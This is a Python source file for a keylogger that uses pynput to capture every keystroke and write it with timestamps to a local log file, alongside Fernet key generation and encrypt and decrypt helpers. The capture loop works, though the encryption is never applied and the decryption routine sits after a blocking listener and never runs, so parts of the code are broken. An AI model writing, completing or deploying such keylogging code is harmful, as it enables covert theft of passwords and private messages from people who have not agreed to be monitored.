from cryptography.fernet import Fernet
from pynput.keyboard import Listener
import logging
import os

# Generating and saving the encryption key if it doesn't exist
def load_or_generate_key():
    if not os.path.exists("key.key"):
        key = Fernet.generate_key()
        with open("key.key", "wb") as key_file:
            key_file.write(key)
    else:
        with open("key.key", "rb") as key_file:
            key = key_file.read()
    return key

# Loading the encryption key
key = load_or_generate_key()
cipher_suite = Fernet(key)

# Setting up logging to store encrypted keystrokes in a file 

log_file = "encryptedkeyslogger.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')  

def encrypt_log(log_entry):
    encrypted_data = cipher_suite.encrypt(log_entry.encode())
    return encrypted_data

# Setting up the log file to store the keystrokes in a file
log_file = "keyslogger.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log the keystrokes
def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error capturing key: {e}")

# Function to start the Listener
with Listener(on_press=on_press) as listener:
    listener.join()

# Decryption Logic 

def decrypt_log_file (log_file):
    with open (log_file, "r") as f:
        encrypted_logs = f.readlines()
        
        for encrypted_log in encrypted_logs: 
            decrypted_log = cipher_suite.decrypt(encrypted_log.encode())
            print (decrypted_log.decode())

            
